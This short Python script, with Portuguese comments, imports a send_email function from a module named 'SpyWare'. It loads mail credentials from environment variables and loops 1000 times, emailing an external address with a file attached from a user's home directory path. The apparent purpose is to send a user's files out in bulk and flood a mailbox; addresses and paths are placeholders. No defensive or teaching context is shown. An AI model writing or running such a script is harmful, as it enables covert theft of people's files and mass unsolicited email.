from SpyWare import send_email
import os

# Obter credenciais das variáveis de ambiente
from_email = os.getenv('EMAIL_USER')
from_password = os.getenv('EMAIL_PASS')

# Verificar se as variáveis de ambiente foram carregadas corretamente
if not from_email or not from_password:
    raise ValueError("As variáveis de ambiente 'EMAIL_USER' e 'EMAIL_PASS' não estão definidas corretamente.")

for i in range(1000):
    send_email(
        subject=f'examplesubject{i+1}',
        body=f'example{i+1}',
        to_email='example@gmail.com',
        from_email=from_email,
        from_password=from_password,
        attachment=r'C:\Users\example'
    )
